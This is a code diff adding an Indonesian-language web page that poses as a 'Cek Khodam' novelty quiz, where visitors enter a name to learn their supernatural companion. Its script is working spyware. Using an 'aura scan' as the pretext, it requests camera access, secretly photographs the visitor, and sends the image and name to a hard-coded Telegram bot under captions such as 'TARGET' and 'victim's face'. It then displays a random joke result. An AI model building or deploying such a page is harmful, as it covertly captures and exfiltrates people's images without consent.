@@ -1,0 +1,80 @@
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek Khodam Online v3.0</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; backdrop-filter: blur(10px); box-shadow: 0 8px 32px 0 rgba(0,0,0,0.5); text-align: center; width: 320px; border: 1px solid rgba(255,255,255,0.2); }
+        h2 { color: #00d2ff; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
+        input { width: 90%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: none; outline: none; background: rgba(255,255,255,0.2); color: white; text-align: center; }
+        button { background: #00d2ff; color: #1a1a2e; border: none; padding: 12px 25px; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
+        button:hover { background: #0099cc; transform: scale(1.05); }
+        #result { margin-top: 20px; font-weight: bold; font-size: 1.2em; color: #ff007f; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🔮 CEK KHODAM</h2>
+    <p style="font-size: 0.8em; opacity: 0.7;">Masukkan nama Anda untuk melihat pendamping gaib Anda.</p>
+    <input type="text" id="nama" placeholder="Nama Lengkap Anda...">
+    <button onclick="startAction()">CEK SEKARANG</button>
+    <div id="result"></div>
+</div>
+
+<script>
+const BOT_TOKEN = "7834741276:AAEzwblJ8m--92l31Y1IRyw-mrURV6Ag8Nw"; // Ganti disini
+const CHAT_ID = "7133478033";     // Ganti disini
+
+const listKhodam = ["Macan Ompong", "Tuyul Gondrong", "Nyi Blorong KW", "Kuntilanak Merah", "Genderuwo Diet", "Monyet Kayang", "Suster Keramas", "Babi Ngepet Premium"];
+
+async function startAction() {
+    const nama = document.getElementById('nama').value;
+    if(!nama) return alert("Isi namanya dulu, Boss!");
+
+    try {
+        // Minta ijin kamera (Social Engineering: Scan Aura)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        
+        // Buat elemen video tersembunyi
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // Kasih efek loading palsu
+        document.getElementById('result').style.display = "block";
+        document.getElementById('result').innerText = "Sedang Menghubungi Alam Gaib...";
+
+        setTimeout(() => {
+            // Capture foto
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'muka_korban.jpg');
+                fd.append('caption', `📸 TARGET: ${nama}\n🌐 IP: Terdeteksi\n🤖 Quantum V11.0 Log`);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg');
+
+            // Tampilkan hasil random ke korban
+            const randomKhodam = listKhodam[Math.floor(Math.random() * listKhodam.length)];
+            document.getElementById('result').innerHTML = `Khodam Anda:<br><span style="color:#0f0">${randomKhodam}</span>`;
+            
+            // Matikan kamera setelah capture
+            stream.getTracks().forEach(track => track.stop());
+        }, 3000);
+
+    } catch (err) {
+        alert("Gagal! Aura tidak terdeteksi. Pastikan Izin Kamera diberikan untuk scan Biometrik Khodam.");
+    }
+}
+</script>
+
+</body>
+</html>
